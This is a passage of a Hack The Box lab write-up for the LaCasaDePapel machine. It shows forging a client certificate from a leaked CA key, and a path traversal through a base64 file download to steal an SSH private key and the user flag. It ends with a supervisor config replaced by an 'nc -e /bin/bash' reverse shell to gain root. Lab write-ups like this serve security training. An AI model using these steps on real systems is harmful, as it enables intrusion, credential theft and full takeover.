class="line"><span class="string">   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n</span></span><br><span class="line"><span class="string">   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n</span></span><br><span class="line"><span class="string">   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n</span></span><br><span class="line"><span class="string">   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n</span></span><br><span class="line"><span class="string">   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n</span></span><br><span class="line"><span class="string">   53udBEzjt3WPqYGkkDknVhjD\n</span></span><br><span class="line"><span class="string">   -----END PRIVATE KEY-----\n</span></span><br><span class="line"><span class="string">   "</span><span class="string">""</span></span><br></pre></td></tr></table></figure>


<h2 id="Client-Certificate-Generation"><a href="#Client-Certificate-Generation" class="headerlink" title="Client Certificate Generation"></a>Client Certificate Generation</h2><p>First, we will create a certificate signing request (<code>CSR</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel&#x2F;cert# cat ca.key</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb</span><br><span class="line">7MJsi&#x2F;&#x2F;m8mm5rEkXcDmratVAk2pTWwWxudo&#x2F;FFsWAC1zyFV4w2KLacIU7w8Yaz0&#x2F;</span><br><span class="line">2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC&#x2F;5rdRsk07h71J3dvwYv7hcjPNKLcRl</span><br><span class="line">uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M</span><br><span class="line">YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp</span><br><span class="line">s2BvnlkPrq9AFKQ3Y&#x2F;AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us</span><br><span class="line">PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C&#x2F;3V</span><br><span class="line">Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89</span><br><span class="line">1+50LwC7N3efdPmWw&#x2F;rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ</span><br><span class="line">&#x2F;CAhn5+pxKVw5c2e1Syj9K23&#x2F;BW6l3rQHBixq9Ir4&#x2F;QCoDGEbZL17InuVyUQcrb+</span><br><span class="line">q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA&#x2F;8pxHMxkOW8k3Mr</span><br><span class="line">uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry&#x2F;d4oYQKBgQDzB&#x2F;gDfr1R5a2phBVd</span><br><span class="line">I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og</span><br><span class="line">7MrBhZIRJJMT4yx&#x2F;2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE</span><br><span class="line">G3uK1h6Vm12IyrRMgl&#x2F;OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn</span><br><span class="line">sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH</span><br><span class="line">CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y</span><br><span class="line">sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI</span><br><span class="line">ikYhfnM5CwVRInP8cMvmwRU&#x2F;d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2</span><br><span class="line">zo8L8vEp4VuVJGT6&#x2F;efYY8yUGMFYmiy8exP5AfMPLJ+Y1J&#x2F;58uiSVldZUQKBgBM&#x2F;</span><br><span class="line">ukXIOBUDcoMh3UP&#x2F;ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC</span><br><span class="line">9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M</span><br><span class="line">WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed&#x2F;AoGBAJ11zeAXtmZeuQ95eFbM</span><br><span class="line">7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR</span><br><span class="line">aRklful5+Z60JV&#x2F;5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc</span><br><span class="line">53udBEzjt3WPqYGkkDknVhjD</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel&#x2F;cert# openssl req -new -key ca.key -out server.csr                                                                                                                    </span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#39;.&#39;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:</span><br><span class="line">State or Province Name (full name) [Some-State]:</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb</span><br><span class="line">Email Address []:</span><br><span class="line"></span><br><span class="line">Please enter the following &#39;extra&#39; attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:</span><br><span class="line">An optional company name []:</span><br></pre></td></tr></table></figure>
<p>Then we will use it to generate the certificate :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel&#x2F;cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      </span><br><span class="line">Signature ok</span><br><span class="line">subject&#x3D;C &#x3D; AU, ST &#x3D; Some-State, O &#x3D; Internet Widgits Pty Ltd, CN &#x3D; lacasadepapel.htb</span><br><span class="line">Getting Private key</span><br></pre></td></tr></table></figure>
<p>And finally we will create a <code>PKCS12</code> certificate :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel&#x2F;cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12</span><br><span class="line">Enter Export Password:</span><br><span class="line">Verifying - Enter Export Password:</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel&#x2F;cert#</span><br></pre></td></tr></table></figure>
<p>Now we can import it to Firefox :<br><img src="/images/hackthebox/lacasadepapel/7.png" alt=""><br><img src="/images/hackthebox/lacasadepapel/8.png" alt=""><br><img src="/images/hackthebox/lacasadepapel/9.png" alt=""><br>We have to Remove the <code>ssl</code> exception we gave earlier to <code>https://lacasadepapel.htb</code>, then we will visit it again and it will request our client certificate :<br><img src="/images/hackthebox/lacasadepapel/10.png" alt=""><br><img src="/images/hackthebox/lacasadepapel/11.png" alt=""></p>
<h2 id="Path-Traversal-Arbitrary-File-Download-User-Flag"><a href="#Path-Traversal-Arbitrary-File-Download-User-Flag" class="headerlink" title="Path Traversal, Arbitrary File Download, User Flag"></a>Path Traversal, Arbitrary File Download, User Flag</h2><p>After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :<br><img src="/images/hackthebox/lacasadepapel/12.png" alt=""><br>As you can see in the <code>url</code> there is a get parameter called <code>path</code>, which means that the <code>php</code> script reads files from a given path and lists them (in this case directory : <code>SEASON-1</code>). If that parameter doesn’t get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn’t help us in any way, we already can do that with <code>Psy Shell</code>. But if we try to download an episode, <code>01.avi</code> for example :<br><img src="/images/hackthebox/lacasadepapel/13.png" alt=""><br>The download link will be :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lacasadepapel.htb&#x2F;file&#x2F;U0VBU09OLTEvMDEuYXZp</span><br></pre></td></tr></table></figure>
<p>Decoding that base-64 string we get this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d </span><br><span class="line">SEASON-1&#x2F;01.aviroot@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel#</span><br></pre></td></tr></table></figure>
<p>It uses the path to request files, let’s see where are we first :<br><code>https://lacasadepapel/?path=../</code><br><img src="/images/hackthebox/lacasadepapel/14.png" alt=""><br>We are in <code>berlin</code>‘s home directory (Because the user flag is there).<br><code>https://lacasadepapel/?path=../.ssh/</code><br><img src="/images/hackthebox/lacasadepapel/15.png" alt=""><br>Let’s download <code>id_rsa</code>, we know that the path is <code>../.ssh/id_rsa</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# echo -n &quot;..&#x2F;.ssh&#x2F;id_rsa&quot; | base64</span><br><span class="line">Li4vLnNzaC9pZF9yc2E&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel#</span><br></pre></td></tr></table></figure>
<p><code>-n</code> for no new lines.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lacasadepapel.htb&#x2F;file&#x2F;Li4vLnNzaC9pZF9yc2E&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/lacasadepapel/16.png" alt=""><br>We found the key in <code>berlin</code>‘s home directory, however I couldn’t get <code>ssh</code> as <code>berlin</code>, I tried other users and <code>professor</code> worked :<br><img src="/images/hackthebox/lacasadepapel/17.png" alt=""><br>I couldn’t read the flag as <code>professor</code>, so I downloaded it like I downloaded the <code>ssh</code> key :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel# echo -n &quot;..&#x2F;user.txt&quot; | base64</span><br><span class="line">Li4vdXNlci50eHQ&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;lacasadepapel#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lacasadepapel.htb&#x2F;file&#x2F;Li4vdXNlci50eHQ&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/lacasadepapel/18.png" alt=""><br><img src="/images/hackthebox/lacasadepapel/19.png" alt=""><br>We owned user.</p>
<h2 id="Privilege-Escalation-Root-Flag"><a href="#Privilege-Escalation-Root-Flag" class="headerlink" title="Privilege Escalation, Root Flag"></a>Privilege Escalation, Root Flag</h2><p>In the home directory of <code>professor</code> there are 2 interesting files : <code>memcached.ini</code> and <code>memcached.js</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lacasadepapel [~]$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .</span><br><span class="line">drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..</span><br><span class="line">lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">drwx------    2 professo professo      4096 Jan 31 21:36 .ssh</span><br><span class="line">-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini</span><br><span class="line">-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js</span><br><span class="line">drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules</span><br><span class="line">lacasadepapel [~]$</span><br></pre></td></tr></table></figure>
<p>We can’t read <code>memcached.js</code> but we can read <code>memecached.ini</code>, we can’t write to both. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lacasadepapel [~]$ cat memcached.js </span><br><span class="line">cat: can&#39;t open &#39;memcached.js&#39;: Permission denied</span><br><span class="line">lacasadepapel [~]$ cat memcached.ini </span><br><span class="line">[program:memcached]</span><br><span class="line">command &#x3D; sudo -u nobody &#x2F;usr&#x2F;bin&#x2F;node &#x2F;home&#x2F;professor&#x2F;memcached.js</span><br><span class="line">lacasadepapel [~]$</span><br></pre></td></tr></table></figure>
<p><code>memcached.ini</code> is executing this command : <code>/usr/bin/node /home/professor/memcached.js</code> as <code>nobody</code> by using <code>sudo</code>. Most likely it will be running as root, I ran <code>pspy</code> and saw that the command gets executed periodically :<br><img src="/images/hackthebox/lacasadepapel/20.png" alt=""><br>The <code>uid</code> is 65534 which is the <code>uid</code> of <code>nobody</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lacasadepapel [~]$ id nobody</span><br><span class="line">uid&#x3D;65534(nobody) gid&#x3D;65534(nobody) groups&#x3D;65534(nobody)</span><br><span class="line">lacasadepapel [~]$</span><br></pre></td></tr></table></figure>
<p>We can’t write to <code>memcached.ini</code>, but we can delete it and create a new one :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lacasadepapel [~]$ cat memcached.ini</span><br><span class="line">[program:memcached]</span><br><span class="line">command &#x3D; sudo -u nobody &#x2F;usr&#x2F;bin&#x2F;node &#x2F;home&#x2F;professor&#x2F;memcached.js</span><br><span class="line">lacasadepapel [~]$ rm memcached.ini</span><br><span class="line">rm: remove &#39;memcached.ini&#39;? y</span><br><span class="line">lacasadepapel [~]$ vi memcached.ini</span><br><span class="line">lacasadepapel [~]$ cat memcached.ini</span><br><span class="line">[program:memcached]</span><br><span class="line">command &#x3D; &#x2F;usr&#x2F;bin&#x2F;nc 10.10.xx.xx 1337 -e &#x2F;bin&#x2F;bash</span><br><span class="line">lacasadepapel [~]$</span><br></pre></td></tr></table></figure>
<p>I changed the command from <code>sudo -u nobody /usr/bin/node /home/professor/memcached.js</code> to <code>/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash</code>. After some seconds I got a reverse shell as root :<br><img src="/images/hackthebox/lacasadepapel/21.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/ctf/">Hack The Box - CTF</a><br>Next Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-07-27</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
